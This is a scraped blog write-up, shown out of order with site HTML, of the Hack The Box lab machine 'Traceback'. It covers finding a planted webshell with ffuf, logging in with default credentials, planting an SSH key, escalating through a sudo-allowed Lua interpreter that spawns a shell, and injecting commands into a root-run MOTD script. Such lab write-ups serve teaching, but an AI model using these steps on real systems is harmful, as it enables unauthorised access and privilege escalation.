sysadmin@traceback:/etc/update-motd.d$ cat 00-header #!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt; # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] &amp;&amp; . /etc/lsb-release echo &quot;\\nWelcome to Xh4H land \\n&quot; cat /root/root.txt id &amp;&amp; whoami sysadmin@traceback:/etc/update-motd.d$ And on login again via SSH i got the root flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 [vibhu@parrot]─[~/.ssh]$ ssh -i id_rsa webadmin@10.10.10.181 ################################# -------- OWNED BY XH4H --------- - I guess stuff could have been configured better ^^ - ################################# Welcome to Xh4H land 9fdc59db[Redacted]58d49e5a uid=0(root) gid=0(root) groups=0(root) root Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Jul 7 10:34:22 2020 from 10.10.14.166 webadmin@traceback:~$ Resources:~$ Topic Link GTFObins Lua Here Update-mode.d Here With this, we come to the end of the story of how I owned Traceback 😃 Thank you for reading !!! I would love to hear about any suggestions or queries.","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/main.css"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script> window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>'); </script> <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="style" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/syntax.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/syntax.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/owner/avatar.jpg" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">Vibhu025</a></div><div id="site-subtitle" class="font-italic">Infosec Blog</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/timeline/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>TIMELINE</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT ME</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <a href="https://hackthebox.eu/profile/270629" target="_blank"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/vibhu-bansal" target="_blank"> <i class="fab fa-linkedin-in"></i> </a> <a href="https://github.com/Vibhu025" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/vibhu_bansal_" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="javascript:window.open('mailto:' + ['Vibhu025','gmail.com'].join('@'))"> <i class="fas fa-envelope"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Traceback Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Traceback Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Wed, Mar 18, 2020, 8:00 PM +0530"> Mar 18, 2020 <i class="unloaded">2020-03-18T20:00:00+05:30</i> </span> by <span class="author"> Vibhu Bansal </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Jul 8, 2020, 2:46 PM +0530"> Jul 8, 2020 <i class="unloaded">2020-07-08T14:46:34+05:30</i> </span></div></div><div class="post-content"> <img src="/assets/img/post/hackthebox/traceback/main.png"><h1 id="information">Information:~$</h1><table><thead><tr><th>Title<th style="text-align: center">Details<tbody><tr><td>Name<td style="text-align: center">Traceback<tr><td>IP<td style="text-align: center">10.10.10.181<tr><td>Difficulty<td style="text-align: center">Easy<tr><td>Points<td style="text-align: center">20<tr><td>OS<td style="text-align: center">Linux<tr><td>Creator<td style="text-align: center"><a href="https://www.hackthebox.eu/home/users/profile/21439">Xh4H</a></table><h1 id="brief">Brief:~$</h1><p>Traceback is easy rated linux box. Intial foothold can be gained using already available webshells on <code class="highlighter-rouge">PORT 80</code> For Priv Esec sysadmin has by exploiting <code class="highlighter-rouge">lua</code> Programming language and for root we can edit the <code class="highlighter-rouge">update-mote.d</code> to gain info when logging thorugh SSH</p><h1 id="reconnaisance">Reconnaisance:~$</h1><h2 id="nmap-scan">Nmap Scan:~$</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/initial 10.10.10.181
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.80 scan initiated Sun Mar 15 20:18:30 2020 as: nmap -sC -sV -oN nmap/initial 10.10.10.181</span>
Nmap scan report <span class="k">for </span>10.10.10.181
Host is up <span class="o">(</span>0.46s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed ports
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 <span class="o">(</span>RSA<span class="o">)</span>
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open     http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Help us
3000/tcp filtered ppp
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sun Mar 15 20:20:03 2020 -- 1 IP address (1 host up) scanned in 93.34 seconds</span>
</pre></table></code></div></div><p>We get 2 Ports Open Lets visit <code class="highlighter-rouge">PORT 80</code></p><p>On visiting the Page we get</p><p><img src="/assets/img/post/hackthebox/traceback/1.png" alt="Traceback" /></p><p>On analyzing the Source code I found</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nt">&lt;body&gt;</span>
	<span class="nt">&lt;center&gt;</span>
		<span class="nt">&lt;h1&gt;</span>This site has been owned<span class="nt">&lt;/h1&gt;</span>
		<span class="nt">&lt;h2&gt;</span>I have left a backdoor for all the net. FREE INTERNETZZZ<span class="nt">&lt;/h2&gt;</span>
		<span class="nt">&lt;h3&gt;</span> - Xh4H - <span class="nt">&lt;/h3&gt;</span>
		<span class="c">&lt;!--Some of the best web shells that you might need ;)--&gt;</span>
	<span class="nt">&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
</pre></table></code></div></div><p>Seems to be some kind of Osint related.</p><p>On quick google search I founded creator github repo with webshells <a href="https://github.com/Xh4H/Web-Shells">Here</a></p><p>Let’s copy these names and see if there is any webshell from these in website</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="o">[</span>vibhu@parrot]─[~/HTB/boxes/ROOTED/Traceback]<span class="nv">$ </span><span class="nb">cat </span>shell.list 
alfa3.php
alfav3.0.1.php
andela.php
bloodsecv4.php
by.php
c99ud.php
cmd.php
configkillerionkros.php
jspshell.jsp
mini.php
obfuscated-punknopass.php
punk-nopass.php
punkholic.php
r57.php
smevk.php
wso2.8.5.php
</pre></table></code></div></div><p>I am going to use FFUF</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="o">[</span>vibhu@parrot]─[~/HTB/boxes/ROOTED/Traceback]<span class="nv">$ </span>ffuf <span class="nt">-c</span> <span class="nt">-w</span> shell.list <span class="nt">-u</span> http://10.10.10.181/FUZZ

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.181/FUZZ
 :: Wordlist         : FUZZ: shell.list
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

smevk.php               [Status: 200, Size: 1261, Words: 318, Lines: 59]
:: Progress: [16/16] :: Job [1/1] :: 5 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
</span></pre></table></code></div></div><p>We got a match let’s visit 10.10.10.181/smevk.php</p><p><img src="/assets/img/post/hackthebox/traceback/2.png" alt="Traceback" /></p><p>On trying admin:admin I got access</p><p><img src="/assets/img/post/hackthebox/traceback/3.png" alt="Traceback" /></p><h1 id="initial-foothold">Initial Foothold:~$</h1><p>Current user is <code class="highlighter-rouge">webadmin</code> and We can upload file in it home dir</p><p>So Let’s upload our ssh keys and get a ssh connection</p><p>Firstly let’s create ssh keys using <code class="highlighter-rouge">ssh-keygen</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="o">[</span>vibhu@parrot]─[~/.ssh]<span class="nv">$ </span>ssh-keygen
Generating public/private rsa key pair.
Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/home/vibhu/.ssh/id_rsa<span class="o">)</span>: 
Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 
Enter same passphrase again: 
Your identification has been saved <span class="k">in</span> /home/vibhu/.ssh/id_rsa
Your public key has been saved <span class="k">in</span> /home/vibhu/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:g2q/D1QAaxEjXK5yCmZmPXDJHcWuup0teaLrTFHuCVE vibhu@parrot
The key<span class="s1">'s randomart image is:
+---[RSA 3072]----+
| ...*E+.         |
|  oo++.o         |
| . =+o. .        |
|  +o+  +         |
|o=o= .+ S        |
|*+  =+.  .       |
|.  .+oo          |
|  oo.=oo         |
|  .*+o*+.        |
+----[SHA256]-----+
[vibhu@parrot]─[~/.ssh]$ 
</span></pre></table></code></div></div><p>now move id_rsa.pub to authorized_keys and upload it in webshell</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="o">[</span>vibhu@parrot]─[~/.ssh]<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa webadmin@10.10.10.181
<span class="c">#################################</span>
<span class="nt">--------</span> OWNED BY XH4H  <span class="nt">---------</span>
- I guess stuff could have been configured better ^^ -
<span class="c">#################################</span>

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Jul  7 10:17:41 2020 from 10.10.14.166
webadmin@traceback:~<span class="nv">$ </span><span class="nb">whoami</span> <span class="o">&amp;&amp;</span> <span class="nb">id
</span>webadmin
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>webadmin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>webadmin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>webadmin<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,111<span class="o">(</span>lpadmin<span class="o">)</span>,112<span class="o">(</span>sambashare<span class="o">)</span>
webadmin@traceback:~<span class="err">$</span>
</pre></table></code></div></div><p>We get a note in <code class="highlighter-rouge">home/webadmin</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>webadmin@traceback:~<span class="nv">$ </span><span class="nb">ls
</span>note.txt
webadmin@traceback:~<span class="nv">$ </span><span class="nb">cat </span>note.txt 
- sysadmin -
I have left a tool to practice Lua.
I am sure you know where to find it.
Contact me <span class="k">if </span>you have any question.
webadmin@traceback:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>webadmin on traceback:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User webadmin may run the following commands on traceback:
    <span class="o">(</span>sysadmin<span class="o">)</span> NOPASSWD: /home/sysadmin/luvit
webadmin@traceback:~<span class="err">$</span>
</pre></table></code></div></div><h1 id="privilege-escalation">Privilege Escalation:~$</h1><h2 id="webadmin---sysadmin">webadmin -&gt; sysadmin</h2><p>Looks like sysadmin has left something related to lua language for us in his home directory</p><p>After some enumertaion I saw we can use <a href="https://gtfobins.github.io/">GTFObins</a> to do priv esec</p><p>So final command would be</p><blockquote><p>sudo -u sysadmin /home/sysadmin/luvit -e ‘os.execute(“/bin/sh”)’</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>webadmin@traceback:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> sysadmin /home/sysadmin/luvit <span class="nt">-e</span> <span class="s1">'os.execute("/bin/sh")'</span>
<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>sysadmin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>sysadmin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>sysadmin<span class="o">)</span>
<span class="nv">$ </span><span class="nb">whoami
whoami
</span>sysadmin
</pre></table></code></div></div><p>and we got user</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd
cd</span>
<span class="nv">$ </span><span class="nb">ls
ls
</span>luvit  pspy64  sysadmin_ssh.pub  user.txt
<span class="nv">$ </span><span class="nb">cat </span>user.txt
<span class="nb">cat </span>user.txt
6bb2<span class="k">*********************</span>302fec
</pre></table></code></div></div><h2 id="sysadmin---root">sysadmin -&gt; root</h2><p>While Logging In Via <code class="highlighter-rouge">SSH</code> I Found Some <code class="highlighter-rouge">Comments</code>, It’s Called Message Of The Day In Linux. It’s Located In <code class="highlighter-rouge">00-header</code> File Under <code class="highlighter-rouge">/etc/update-motd.d/</code> Directory.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span>
total 32K
drwxr-xr-x  2 root sysadmin 4.0K Aug 27  2019 <span class="nb">.</span>
drwxr-xr-x 80 root root     4.0K Mar 16 03:55 ..
<span class="nt">-rwxrwxr-x</span>  1 root sysadmin  981 Jul  7 10:23 00-header
<span class="nt">-rwxrwxr-x</span>  1 root sysadmin  982 Jul  7 10:23 10-help-text
<span class="nt">-rwxrwxr-x</span>  1 root sysadmin 4.2K Jul  7 10:23 50-motd-news
<span class="nt">-rwxrwxr-x</span>  1 root sysadmin  604 Jul  7 10:23 80-esm
<span class="nt">-rwxrwxr-x</span>  1 root sysadmin  299 Jul  7 10:23 91-release-upgrade
</pre></table></code></div></div><p>00-header contain the meesage that is displayed on login via ssh</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span><span class="nb">cat </span>00-header 
<span class="c">#!/bin/sh</span>
<span class="c">#</span>
<span class="c">#    00-header - create the header of the MOTD</span>
<span class="c">#    Copyright (C) 2009-2010 Canonical Ltd.</span>
<span class="c">#</span>
<span class="c">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
<span class="c">#</span>
<span class="c">#    This program is free software; you can redistribute it and/or modify</span>
<span class="c">#    it under the terms of the GNU General Public License as published by</span>
<span class="c">#    the Free Software Foundation; either version 2 of the License, or</span>
<span class="c">#    (at your option) any later version.</span>
<span class="c">#</span>
<span class="c">#    This program is distributed in the hope that it will be useful,</span>
<span class="c">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span class="c">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span class="c">#    GNU General Public License for more details.</span>
<span class="c">#</span>
<span class="c">#    You should have received a copy of the GNU General Public License along</span>
<span class="c">#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
<span class="c">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>

<span class="o">[</span> <span class="nt">-r</span> /etc/lsb-release <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">.</span> /etc/lsb-release


<span class="nb">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Welcome to Xh4H land </span><span class="se">\n</span><span class="s2">"</span>
sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span>
</pre></table></code></div></div><p>Let’s see if we can read root flag through this</p><blockquote><p>echo “cat /root/root.txt” » 00-header echo “id &amp;&amp; whoami” » 00-header</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span><span class="nb">cat </span>00-header 
<span class="c">#!/bin/sh</span>
<span class="c">#</span>
<span class="c">#    00-header - create the header of the MOTD</span>
<span class="c">#    Copyright (C) 2009-2010 Canonical Ltd.</span>
<span class="c">#</span>
<span class="c">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
<span class="c">#</span>
<span class="c">#    This program is free software; you can redistribute it and/or modify</span>
<span class="c">#    it under the terms of the GNU General Public License as published by</span>
<span class="c">#    the Free Software Foundation; either version 2 of the License, or</span>
<span class="c">#    (at your option) any later version.</span>
<span class="c">#</span>
<span class="c">#    This program is distributed in the hope that it will be useful,</span>
<span class="c">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span class="c">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span class="c">#    GNU General Public License for more details.</span>
<span class="c">#</span>
